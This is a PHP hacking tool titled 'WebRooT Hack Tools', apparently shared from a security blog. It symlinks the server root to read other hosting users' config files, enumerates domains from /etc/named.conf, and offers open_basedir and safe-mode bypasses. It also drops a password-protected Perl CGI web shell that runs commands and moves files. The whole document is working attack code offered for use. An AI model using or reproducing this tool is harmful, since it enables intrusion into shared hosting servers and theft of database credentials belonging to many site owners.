http://m4rc0-security.blogspot.com/

<?php
@set_time_limit(0);
$IIIIIIIIIIll = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$IIIIIIIIIIl1=explode('/',$IIIIIIIIIIll );
$IIIIIIIIIIll =str_replace($IIIIIIIIIIl1[count($IIIIIIIIIIl1)-1],'',$IIIIIIIIIIll );
;echo '  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<title>WebRooT Hack Tools</title>
<style type="text/css">
/* STIL DOSYAMIZI OLUÞTURMAYA BAÞLIYORUZ... */

#wrap {width:100%;margin:0 auto;}

/* Menü kodlarýmýz bu alanda baþlýyor, lütfen yorumlarý takip ediniz. */

#menu {
font:14px arial, verdana, sans-serif;
width:100%
}

#menu ul {
list-style:none;
margin:0;
background:#3ca0df url(menubg.gif) repeat-x bottom; /* menü arkaplan resmimiz tanýmlanýyor. */
padding:5px;

/* Firefox, Chrome, Safari tarayýcýlar için Border radius ve Shadow tanýmlarý yapýlýyor */

-moz-border-radius:4px; /* menümüzün yuvarlak köþeleri tanýmlanýyor. */
-moz-box-shadow:0px 1px 2px #333; /* burada menümüze çok küçük bir gölge efekti veriyoruz */

-khtml-border-radius:4px; /* menümüzün yuvarlak köþeleri tanýmlanýyor. */
-khtml-box-shadow:0px 1px 2px #333; /* burada menümüze çok küçük bir gölge efekti veriyoruz */

-webkit-border-radius:4px; /* menümüzün yuvarlak köþeleri tanýmlanýyor. */
-webkit-box-shadow:0px 1px 2px #333; /* burada menümüze çok küçük bir gölge efekti veriyoruz */
}

#menu li { /* menümüzün liste tanýmý yapýlýyor. */
list-style:none;
padding:0;
margin:0;
float:left;
position:relative;
}

#menu a {
color:#fff;
text-decoration:none;
padding:4px;
display:block;
text-shadow:0px 1px 2px #000;
margin:0px 10px 0px 10px;
}

#menu a:hover {
color:#fff;
text-decoration:none;
padding:4px;
background:#333;
-moz-border-radius:3px; /* menü baðlantýlarýmýza küçük bir gölge efekti veriyoruz. */
-khtml-border-radius:3px;
-webkit-border-radius:3px;
display:block;
}

/* Alt menülerimizi gizliyor ve sonrasýnda alt menünün stil tanýmlamalarýna geçiyoruz. */

#menu li ul {
display:none; /* Alt menülerimizi gizliyoruz! */
position:absolute;
padding:0px;
margin:0px;
}

#menu li:hover > ul {
display:block; /* Alt menülerimiz #menu li üzerine fare ile gelinince görünecek þekilde hover ile gösterimini saðlýyoruz. */
position:absolute;
padding:0px 0px 0px 0px; /* margin ve padding deðerlerini uygun þekilde ayarlýyoruz. */
margin:0px 10px 0px 10px;
width:150px;
left:0
}


/* Alt menü görünümünü deðiþtirecek olan stilleri yazýyoruz. */

#menu ul ul {
-moz-border-radius:4px; /* alt menümüzün köþelerini yuvarlýyoruz. */
-webkit-box-shadow:0px 1px 2px #2e83ff; /* ve burada da biraz gölge katýyoruz. */
-khtml-box-shadow:0px 1px 2px #2e83ff; /* ve burada da biraz gölge katýyoruz. */

width:150px;
margin:0px 10px 0px 10px;
border:1px solid #777;

}

#menu ul ul li {
display:block;
float:none;
}

#menu ul ul a { /* alt menü listemizin linklerini tanýmlýyoruz. */
display:block;
font:14px/20px arial, verdana, sans-serif;
margin:0;
background:#888;
border-bottom:1px solid #777
}

#menu ul ul a:hover {
background:#f5cd14;
color:#fff;
}

/* Buradan sonraki satýrlar önizleme sayfamýzda yaptýðýmýz açýklama alanlarýný tanýmlýyor */

.bilgi {margin:0 auto;width:700px;background:#eee;color:#333;border:2px solid #ddd;margin:30px 0px 10px 0px;padding:10px;font:14px/24px arial, verdana, sans-serif;text-align:left;}
.bilgi h2 {font:bold 18px arial, verdana, sans-serif;color:#f91365;}
.bilgi a {color:#fff; background:#2e83ff;padding:4px;text-decoration:none}
.bilgi a:hover {color:#fff; background:#333;padding:4px;text-decoration:none}
.bilgi em {border-bottom:1px solid #999;}
</style>
<style type="text/css">

  html,body {
     margin: 0;
     padding: 0;
     outline: 0;
}


body {
    direction: ltr;
    background-color:#F4F4F4;
	color: rgb(153, 153, 153);
    text-align: center
}

input,textarea,select{
font-weight: bold;
color: #111111;
dashed #ffffff;
border: 1px
solid #BBBBBB;
background-color: #DDDDDD;
}


.hedr {
  font-family: Tahoma, Arial, sans-serif  ;
  font-size: 22px;


}

.cont a{

 text-decoration: none;
 color:rgb(153, 153, 153);
 font-family: Tahoma, Arial, sans-serif  ;
 font-size: 16px;
 text-shadow: 0px 0px 3px ;
}

.cont a:hover{


  color: #EEEEEE ;
  text-shadow:0px 0px 3px #000000 ;


}

.tmp tr td{

border: solid 1px #BBBBBB;

padding: 2px ;
  font-size: 13px;
}

.tmp tr td a {
  text-decoration: none;



}

.foter{
  font-size: 9pt;
  color: #AAAAAA ;
  text-align: center
}

.tmp tr td:hover{

box-shadow: 0px 0px 4px #888888;

}
.fot{

font-family:Tahoma, Arial, sans-serif;

  font-size: 13pt;
}

.ir {
  color: #FF0000;
}

</style>

</head>

<body>

<div class=\'all\'>


';
@mkdir('sym',0777);
$IIIIIIIIII11  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$IIIIIIIIIlII =@fopen ('sym/.htaccess','w');
fwrite($IIIIIIIIIlII ,$IIIIIIIIII11);
@symlink('/','sym/root');
$IIIIIIIIIlll = basename(__FILE__);
echo '<div id=wrap>
<div id=menu>
<ul>

<li><a href=?>AnaSayfa</a>

</li>

<li><a href=?webr00t=sym>User & Domains & Symlink & Pagerank</a>

</li>

<li><a href=?webr00t=sec>Domains & Script</a>

</li>


<li><a href=?webr00t=file>Symlink File</a>

</li>

<li><a href=?webr00t=telnet>Cgi Shell</a>

</li>

<li><a href=?webr00t=open&basedir=bypass>Open_Basedir Bypass</a>
</li>

<li><a href=?webr00t=config>Config Fucker</a>
</li>

<br style=clear:both />
</ul>




</div>

</div>';
echo '<div id=wrap>
<div id=menu>
<ul>

<li><a href=?webr00t=php_ini>Safe Mod Fucker</a>

</li>

<li><a href=?webr00t=indexer>Script indexer</a>
</li>

<li><a href=?webr00t=wp>Wordpress Mysql Admin Shell </a>
</li>

<li><a href=?webr00t=joom>Joomla Mysql Admin Shell </a>
</li>

<br style=clear:both />
</ul>




</div>

</div>';
if(isset($_REQUEST['webr00t']))
{
switch ($_REQUEST['webr00t'])
{
case 'sec':
$IIIIIIIIIl1I = @file('/etc/named.conf');
if(!$IIIIIIIIIl1I)
{
die (" can't read /etc/named.conf");
}
else
{
echo "<img
src=http://img810.imageshack.us/img810/8043/webr00t12.png><div class='tmp'>
<table align='center' width='40%'><td> Domains </td><td> Script </td>";
foreach($IIIIIIIIIl1I as $IIIIIIIIIl11){
if(eregi('zone',$IIIIIIIIIl11)){
preg_match_all('#zone "(.*)"#',$IIIIIIIIIl11,$IIIIIIIII1I1);
flush();
if(strlen(trim($IIIIIIIII1I1[1][0])) >2){
$IIIIIIIII1l1 = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIII1I1[1][0]));
$IIIIIIIII111=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/wp-config.php';
$IIIIIIIIlIII=get_headers($IIIIIIIII111);
$IIIIIIIIlIIl=$IIIIIIIIlIII[0];
$IIIIIIIIlII1=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/blog/wp-config.php';
$IIIIIIIIlIlI=get_headers($IIIIIIIIlII1);
$IIIIIIIIlIll=$IIIIIIIIlIlI[0];
$IIIIIIIIlIl1=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/configuration.php';
$IIIIIIIIlI1I=get_headers($IIIIIIIIlIl1);
$IIIIIIIIlI1l=$IIIIIIIIlI1I[0];
$IIIIIIIIlI11=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/joomla/configuration.php';
$IIIIIIIIllII=get_headers($IIIIIIIIlI11);
$IIIIIIIIllIl=$IIIIIIIIllII[0];
$IIIIIIIIllI1=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/includes/config.php';
$IIIIIIIIlllI=get_headers($IIIIIIIIllI1);
$IIIIIIIIllll=$IIIIIIIIlllI[0];
$IIIIIIIIlll1=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/vb/includes/config.php';
$IIIIIIIIll1I=get_headers($IIIIIIIIlll1);
$IIIIIIIIll1l=$IIIIIIIIll1I[0];
$IIIIIIIIll11=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/forum/includes/config.php';
$IIIIIIIIl1II=get_headers($IIIIIIIIll11);
$IIIIIIIIl1Il=$IIIIIIIIl1II[0];
$IIIIIIIIl1I1=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'public_html/clients/configuration.php';
$IIIIIIIIl1lI=get_headers($IIIIIIIIl1I1);
$IIIIIIIIl1ll=$IIIIIIIIl1lI[0];
$IIIIIIIIl1l1=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/support/configuration.php';
$IIIIIIIIl1lI=get_headers($IIIIIIIIl1l1);
$IIIIIIIIl11I=$IIIIIIIIl1lI[0];
$IIIIIIIIl11l=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/client/configuration.php';
$IIIIIIIIl111=get_headers($IIIIIIIIl11l);
$IIIIIIII1III=$IIIIIIIIl111[0];
$IIIIIIII1IIl=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/submitticket.php';
$IIIIIIII1II1=get_headers($IIIIIIII1IIl);
$IIIIIIII1IlI=$IIIIIIII1II1[0];
$IIIIIIII1Ill=$IIIIIIIIIIll.'/sym/root/home/'.$IIIIIIIII1l1['name'].'/public_html/client/configuration.php';
$IIIIIIII1Il1=get_headers($IIIIIIII1Ill);
$IIIIIIII1I1I=$IIIIIIII1Il1[0];
$IIIIIIII1I1l = strpos($IIIIIIIIlIIl,'200');
$IIIIIIII1lII='&nbsp;';
if (strpos($IIIIIIIIlIIl,'200') == true )
{
$IIIIIIII1lII="<a href='".$IIIIIIIII111."' target='_blank'>Wordpress</a>";
}
elseif (strpos($IIIIIIIIlIll,'200') == true)
{
$IIIIIIII1lII="<a href='".$IIIIIIIIlII1."' target='_blank'>Wordpress</a>";
}
elseif (strpos($IIIIIIIIlI1l,'200')  == true and strpos($IIIIIIII1IlI,'200')  == true )
{
$IIIIIIII1lII=" <a href='".$IIIIIIII1IIl."' target='_blank'>WHMCS</a>";
}
elseif (strpos($IIIIIIIIl11I,'200')  == true)
{
$IIIIIIII1lII =" <a href='".$IIIIIIIIl1l1."' target='_blank'>WHMCS</a>";
}
elseif (strpos($IIIIIIII1III,'200')  == true)
{
$IIIIIIII1lII =" <a href='".$IIIIIIIIl11l."' target='_blank'>WHMCS</a>";
}
elseif (strpos($IIIIIIIIlI1l,'200')  == true)
{
$IIIIIIII1lII=" <a href='".$IIIIIIIIlIl1."' target='_blank'>Joomla</a>";
}
elseif (strpos($IIIIIIIIllIl,'200')  == true)
{
$IIIIIIII1lII=" <a href='".$IIIIIIIIlI11."' target='_blank'>Joomla</a>";
}
elseif (strpos($IIIIIIIIllll,'200')  == true)
{
$IIIIIIII1lII=" <a href='".$IIIIIIIIllI1."' target='_blank'>vBulletin</a>";
}
elseif (strpos($IIIIIIIIll1l,'200')  == true)
{
$IIIIIIII1lII=" <a href='".$IIIIIIIIlll1."' target='_blank'>vBulletin</a>";
}
elseif (strpos($IIIIIIIIl1Il,'200')  == true)
{
$IIIIIIII1lII=" <a href='".$IIIIIIIIll11."' target='_blank'>vBulletin</a>";
}
else
{
continue;
}
$IIIIIIII1lIl = $IIIIIIIII1l1['name'] ;
echo '<tr><td><a href=http://www.'.$IIIIIIIII1I1[1][0].'/>'.$IIIIIIIII1I1[1][0].'</a></td>
<td>'.$IIIIIIII1lII.'</td></tr>';flush();
}
}
}
}
break;
case 'sym':
function IIIIIIII1lI1($IIIIIIII1llI,$IIIIIIII1lll,$IIIIIIII1ll1) 
{
$IIIIIIII1l1I = 4294967296;
$IIIIIIII1l1l = strlen($IIIIIIII1llI);
for ($IIIIIIII1l11 = 0;$IIIIIIII1l11 <$IIIIIIII1l1l;$IIIIIIII1l11++) {
$IIIIIIII1lll *= $IIIIIIII1ll1;
if ($IIIIIIII1lll >= $IIIIIIII1l1I) {
$IIIIIIII1lll = ($IIIIIIII1lll -$IIIIIIII1l1I * (int) ($IIIIIIII1lll / $IIIIIIII1l1I));
$IIIIIIII1lll = ($IIIIIIII1lll <-2147483648) ?($IIIIIIII1lll +$IIIIIIII1l1I) : $IIIIIIII1lll;
}
$IIIIIIII1lll += ord($IIIIIIII1llI{$IIIIIIII1l11});
}
return $IIIIIIII1lll;
}
function IIIIIIII11Il($IIIIIIII11I1) 
{
$IIIIIIII11lI = IIIIIIII1lI1($IIIIIIII11I1,0x1505,0x21);
$IIIIIIII11ll = IIIIIIII1lI1($IIIIIIII11I1,0,0x1003F);
$IIIIIIII11lI >>= 2;
$IIIIIIII11lI = (($IIIIIIII11lI >>4) &0x3FFFFC0 ) |($IIIIIIII11lI &0x3F);
$IIIIIIII11lI = (($IIIIIIII11lI >>4) &0x3FFC00 ) |($IIIIIIII11lI &0x3FF);
$IIIIIIII11lI = (($IIIIIIII11lI >>4) &0x3C000 ) |($IIIIIIII11lI &0x3FFF);
$IIIIIIII11l1 = (((($IIIIIIII11lI &0x3C0) <<4) |($IIIIIIII11lI &0x3C)) <<2 ) |($IIIIIIII11ll &0xF0F );
$IIIIIIII111I = (((($IIIIIIII11lI &0xFFFFC000) <<4) |($IIIIIIII11lI &0x3C00)) <<0xA) |($IIIIIIII11ll &0xF0F0000 );
return ($IIIIIIII11l1 |$IIIIIIII111I);
}
function IIIIIIII111l($IIIIIIII1111) 
{
$IIIIIIIlIIII = 0;
$IIIIIIIlIIIl = 0;
$IIIIIIIlIII1 = sprintf('%u',$IIIIIIII1111) ;
$IIIIIIII1l1l = strlen($IIIIIIIlIII1);
for ($IIIIIIII1l11 = $IIIIIIII1l1l -1;$IIIIIIII1l11 >= 0;$IIIIIIII1l11 --) {
$IIIIIIIlIIll = $IIIIIIIlIII1{$IIIIIIII1l11};
if (1 === ($IIIIIIIlIIIl %2)) {
$IIIIIIIlIIll += $IIIIIIIlIIll;
$IIIIIIIlIIll = (int)($IIIIIIIlIIll / 10) +($IIIIIIIlIIll %10);
}
$IIIIIIIlIIII += $IIIIIIIlIIll;
$IIIIIIIlIIIl ++;
}
$IIIIIIIlIIII %= 10;
if (0 !== $IIIIIIIlIIII) {
$IIIIIIIlIIII = 10 -$IIIIIIIlIIII;
if (1 === ($IIIIIIIlIIIl %2) ) {
if (1 === ($IIIIIIIlIIII %2)) {
$IIIIIIIlIIII += 9;
}
$IIIIIIIlIIII >>= 1;
}
}
return '7'.$IIIIIIIlIIII.$IIIIIIIlIII1;
}
function IIIIIIIlIIl1($IIIIIIIlII1I) {
$IIIIIIIlII1l = curl_init();
curl_setopt($IIIIIIIlII1l,CURLOPT_HEADER,0);
curl_setopt($IIIIIIIlII1l,CURLOPT_RETURNTRANSFER,1);
curl_setopt($IIIIIIIlII1l,CURLOPT_URL,$IIIIIIIlII1I);
$IIIIIIIlIlIl = curl_exec($IIIIIIIlII1l);
curl_close($IIIIIIIlII1l);
return $IIIIIIIlIlIl;
}
function IIIIIIIlIlll($IIIIIIIlII1I) {
$IIIIIIIlIll1='http://toolbarqueries.google.com/tbr?client=navclient-auto&hl=en&ch='.IIIIIIII111l(IIIIIIII11Il($IIIIIIIlII1I)).'&features=Rank&q=info:'.$IIIIIIIlII1I.'&num=100&filter=0';
$IIIIIIIlIlIl=IIIIIIIlIIl1($IIIIIIIlIll1);
$IIIIIIIlIl1I = strpos($IIIIIIIlIlIl,'Rank_');
if($IIIIIIIlIl1I === false){}else{
$IIIIIIIlIl1l = substr($IIIIIIIlIlIl,$IIIIIIIlIl1I +9);
return $IIIIIIIlIl1l;
}
}
$IIIIIIIIIl1I = @file('/etc/named.conf');
if(!$IIIIIIIIIl1I)
{
die (" can't read /etc/named.conf");
}
else
{
echo "<img
src=http://img810.imageshack.us/img810/8043/webr00t12.png><div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td><td>Pagerank</td>";
foreach($IIIIIIIIIl1I as $IIIIIIIIIl11){
if(eregi('zone',$IIIIIIIIIl11)){
preg_match_all('#zone "(.*)"#',$IIIIIIIIIl11,$IIIIIIIII1I1);
flush();
if(strlen(trim($IIIIIIIII1I1[1][0])) >2){
$IIIIIIIII1l1 = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIII1I1[1][0]));
$IIIIIIII1lIl = $IIIIIIIII1l1['name'] ;
@symlink('/','sym/root');
$IIIIIIII1lIl = $IIIIIIIII1I1[1][0];
$IIIIIIIlI1II = '\.ir';
$IIIIIIIlI1Il = '\.il';
if (eregi("$IIIIIIIlI1II",$IIIIIIIII1I1[1][0]) or eregi("$IIIIIIIlI1Il",$IIIIIIIII1I1[1][0]) )
{
$IIIIIIII1lIl = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$IIIIIIIII1I1[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$IIIIIIIII1I1[1][0].'/>'.$IIIIIIII1lIl.' </a> </div>
</td>


<td>
'.$IIIIIIIII1l1['name']."
</td>

<td>
<a href='sym/root/home/".$IIIIIIIII1l1['name']."/public_html' target='_blank'>symlink </a>
</td>

<td><b><font color=red> ".IIIIIIIlIlll($IIIIIIIII1I1[1][0]).'</b></font></td>
</tr></div> ';
flush();
}
}
}
}
break;
case 'file':
echo '
<img
src=http://img810.imageshack.us/img810/8043/webr00t12.png>

<br /><br />
<form method="post">
<input type="text" name="file" value="/home/user/public_html/config.php" size="60"/><br /><br />
<input type="text" name="symfile" value="( Ornek: 1.txt )" size="60"/><br /><br />
<input type="submit" value="symlink" name="symlink" /> <br /><br />



</form>
';
$IIIIIIIlI1I1 = $_POST['file'];
$IIIIIIIlI1lI = $_POST['symfile'];
$IIIIIIIlI1ll = $_POST['symlink'];
if ($IIIIIIIlI1ll)
{
@symlink("$IIIIIIIlI1I1","sym/$IIIIIIIlI1lI");
echo '<br /><a target="_blank" href="sym/'.$IIIIIIIlI1lI.'" >'.$IIIIIIIlI1lI.'</a>';
}
break;
case 'telnet':
mkdir('cgiweb',0755);
chdir('cgiweb');
$IIIIIIIlI11I = '.htaccess';
$IIIIIIIlI11l = "$IIIIIIIlI11I";
$IIIIIIIlI111 = fopen ($IIIIIIIlI11l ,'w') or die ('Dosya a&#231;&#305;lamad&#305;!');
$IIIIIIIllIII = 'Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .root

AddHandler cgi-script .root
AddHandler cgi-script .root';
fwrite ( $IIIIIIIlI111 ,$IIIIIIIllIII ) ;
fclose ($IIIIIIIlI111);
$IIIIIIIllII1 = '#!/usr/bin/perl -I/usr/local/bandmain
#------------------------------------------------------------------------------
# <b style="color:black;background-color:#ffff66">webr00t cgi shell</b> # server
#------------------------------------------------------------------------------

#------------------------------------------------------------------------------
# Configuration: You need to change only $Password and $WinNT. The other
# values should work fine for most systems.
#------------------------------------------------------------------------------
$Password = "webr00t";		# Change this. You will need to enter this
				# to login.

$WinNT = 0;			# You need to change the value of this to 1 if
				# you're running this script on a Windows NT
				# machine. If you're running it on Unix, you
				# can leave the value as it is.

$NTCmdSep = "&";		# This character is used to seperate 2 commands
				# in a command line on Windows NT.

$UnixCmdSep = ";";		# This character is used to seperate 2 commands
				# in a command line on Unix.

$CommandTimeoutDuration = 10;	# Time in seconds after commands will be killed
				# Don't set this to a very large value. This is
				# useful for commands that may hang or that
				# take very long to execute, like "find /".
				# This is valid only on Unix servers. It is
				# ignored on NT Servers.

$ShowDynamicOutput = 1;		# If this is 1, then data is sent to the
				# browser as soon as it is output, otherwise
				# it is buffered and send when the command
				# completes. This is useful for commands like
				# ping, so that you can see the output as it
				# is being generated.

# DON'T CHANGE ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING !!

$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
$CmdPwd = ($WinNT ? "cd" : "pwd");
$PathSep = ($WinNT ? "\\" : "/");
$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");

#------------------------------------------------------------------------------
# Reads the input sent by the browser and parses the input variables. It
# parses GET, POST and multipart/form-data that is used for uploading files.
# The filename is stored in $in{'f'} and the data is stored in $in{'filedata'}.
# Other variables can be accessed using $in{'var'}, where var is the name of
# the variable. Note: Most of the code in this function is taken from other CGI
# scripts.
#------------------------------------------------------------------------------
sub ReadParse 
{
	local (*in) = @_ if @_;
	local ($i, $loc, $key, $val);
	
	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;

	if($ENV{'REQUEST_METHOD'} eq "GET")
	{
		$in = $ENV{'QUERY_STRING'};
	}
	elsif($ENV{'REQUEST_METHOD'} eq "POST")
	{
		binmode(STDIN) if $MultipartFormData & $WinNT;
		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
	}

	# handle file upload data
	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
	{
		$Boundary = '--'.$1; # please refer to RFC1867 
		@list = split(/$Boundary/, $in); 
		$HeaderBody = $list[1];
		$HeaderBody =~ /\r\n\r\n|\n\n/;
		$Header = $`;
		$Body = $';
 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
		$in{'filedata'} = $Body;
		$Header =~ /filename=\"(.+)\"/; 
		$in{'f'} = $1; 
		$in{'f'} =~ s/\"//g;
		$in{'f'} =~ s/\s//g;

		# parse trailer
		for($i=2; $list[$i]; $i++)
		{ 
			$list[$i] =~ s/^.+name=$//;
			$list[$i] =~ /\"(\w+)\"/;
			$key = $1;
			$val = $';
			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} = $val; 
		}
	}
	else # standard post data (url encoded, not multipart)
	{
		@in = split(/&/, $in);
		foreach $i (0 .. $#in)
		{
			$in[$i] =~ s/\+/ /g;
			($key, $val) = split(/=/, $in[$i], 2);
			$key =~ s/%(..)/pack("c", hex($1))/ge;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} .= "\0" if (defined($in{$key}));
			$in{$key} .= $val;
		}
	}
}

#------------------------------------------------------------------------------
# Prints the HTML Page Header
# Argument 1: Form item name to which focus should be set
#------------------------------------------------------------------------------
sub PrintPageHeader
{
	$EncodedCurrentDir = $CurrentDir;
	$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
	print "Content-type: text/html\n\n";
	print <<END;
<html>
<head>
<title>webr00t cgi shell</title>
$HtmlMetaHeader

<meta name="keywords" content="W£ßRooT,webr00t,webr00t.info,hacker">
<meta name="description" content="W£ßRooT,webr00t,webr00t.info,hacker">
</head>
<body onLoad="document.f.@_.focus()" bgcolor="#FFFFFF" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0" text="#FF0000">
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
<td bgcolor="#FFFFFF" bordercolor="#FFFFFF" align="center" width="1%">
<b><font size="2">#</font></b></td>
<td bgcolor="#FFFFFF" width="98%"><font face="Verdana" size="2"><b> 
<b style="color:black;background-color:#ffff66">webr00t cgi shell</b> Connected to $ServerName</b></font></td>
</tr>
<tr>
<td colspan="2" bgcolor="#FFFFFF"><font face="Verdana" size="2">

<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir"><font color="#FF0000">Upload File</font></a> | 
<a href="$ScriptLocation?a=download&d=$EncodedCurrentDir"><font color="#FF0000">Download File</font></a> |
<a href="$ScriptLocation?a=logout"><font color="#FF0000">Disconnect</font></a> |
</font></td>
</tr>
</table>
<font size="3">
END
}

#------------------------------------------------------------------------------
# Prints the Login Screen
#------------------------------------------------------------------------------
sub PrintLoginScreen
{
	$Message = q$<pre><img border="0" src="http://img810.imageshack.us/img810/8043/webr00t12.png"></pre><br><br></font><h1>Sifre=webr00t</h1>
$;
#'
	print <<END;
<code>

Trying $ServerName...<br>
Connected to $ServerName<br>
Escape character is ^]
<code>$Message
END
}

#------------------------------------------------------------------------------
# Prints the message that informs the user of a failed login
#------------------------------------------------------------------------------
sub PrintLoginFailedMessage
{
	print <<END;
<code>
<br>login: admin<br>
password:<br>
Login incorrect<br><br>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form for logging in
#------------------------------------------------------------------------------
sub PrintLoginForm
{
	print <<END;
<code>

<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="login">
</font>
<font size="3">
login: <b style="color:black;background-color:#ffff66">webr00t cgi shell</b><br>
password:</font><font color="#009900" size="3"><input type="password" name="p">
<input type="submit" value="Enter">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the footer for the HTML Page
#------------------------------------------------------------------------------
sub PrintPageFooter
{
	print "</font></body></html>";
}

#------------------------------------------------------------------------------
# Retreives the values of all cookies. The cookies can be accesses using the
# variable $Cookies{''}
#------------------------------------------------------------------------------
sub GetCookies
{
	@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
	foreach $cookie(@httpcookies)
	{
		($id, $val) = split(/=/, $cookie);
		$Cookies{$id} = $val;
	}
}

#------------------------------------------------------------------------------
# Prints the screen when the user logs out
#------------------------------------------------------------------------------
sub PrintLogoutScreen
{
	print "<code>Connection closed by foreign host.<br><br></code>";
}

#------------------------------------------------------------------------------
# Logs out the user and allows the user to login again
#------------------------------------------------------------------------------
sub PerformLogout
{
	print "Set-Cookie: SAVEDPWD=;\n"; # remove password cookie
	&PrintPageHeader("p");
	&PrintLogoutScreen;

	&PrintLoginScreen;
	&PrintLoginForm;
	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function is called to login the user. If the password matches, it
# displays a page that allows the user to run commands. If the password doens't
# match or if no password is entered, it displays a form that allows the user
# to login
#------------------------------------------------------------------------------
sub PerformLogin 
{
	if($LoginPassword eq $Password) # password matched
	{
		print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
		&PrintPageHeader("c");
		&PrintCommandLineInputForm;
		&PrintPageFooter;
	}
	else # password didn't match
	{
		&PrintPageHeader("p");
		&PrintLoginScreen;
		if($LoginPassword ne "") # some password was entered
		{
			&PrintLoginFailedMessage;

		}
		&PrintLoginForm;
		&PrintPageFooter;
	}
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to enter commands
#------------------------------------------------------------------------------
sub PrintCommandLineInputForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
	print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="command">
<input type="hidden" name="d" value="$CurrentDir">
$Prompt
<input type="text" name="c">
<input type="submit" value="Enter">
</form>
</code>

END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to download files
#------------------------------------------------------------------------------
sub PrintFileDownloadForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
	print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="download">
$Prompt download<br><br>
Filename: <input type="text" name="f" size="35"><br><br>
Download: <input type="submit" value="Begin">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to upload files
#------------------------------------------------------------------------------
sub PrintFileUploadForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
	print <<END;
<code>

<form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
$Prompt upload<br><br>
Filename: <input type="file" name="f" size="35"><br><br>
Options: &nbsp;<input type="checkbox" name="o" value="overwrite">
Overwrite if it Exists<br><br>
Upload:&nbsp;&nbsp;&nbsp;<input type="submit" value="Begin">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="upload">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# This function is called when the timeout for a command expires. We need to
# terminate the script immediately. This function is valid only on Unix. It is
# never called when the script is running on NT.
#------------------------------------------------------------------------------
sub CommandTimeout
{
	if(!$WinNT)
	{
		alarm(0);
		print <<END;
</xmp>

<code>
Command exceeded maximum time of $CommandTimeoutDuration second(s).
<br>Killed it!
END
		&PrintCommandLineInputForm;
		&PrintPageFooter;
		exit;
	}
}

#------------------------------------------------------------------------------
# This function is called to execute commands. It displays the output of the
# command and allows the user to enter another command. The change directory
# command is handled differently. In this case, the new directory is stored in
# an internal variable and is used each time a command has to be executed. The
# output of the change directory command is not displayed to the users
# therefore error messages cannot be displayed.
#------------------------------------------------------------------------------
sub ExecuteCommand
{
	if($RunCommand =~ m/^\s*cd\s+(.+)/) # it is a change dir command
	{
		# we change the directory internally. The output of the
		# command is not displayed.
		
		$OldDir = $CurrentDir;
		$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
		chop($CurrentDir = `$Command`);
		&PrintPageHeader("c");
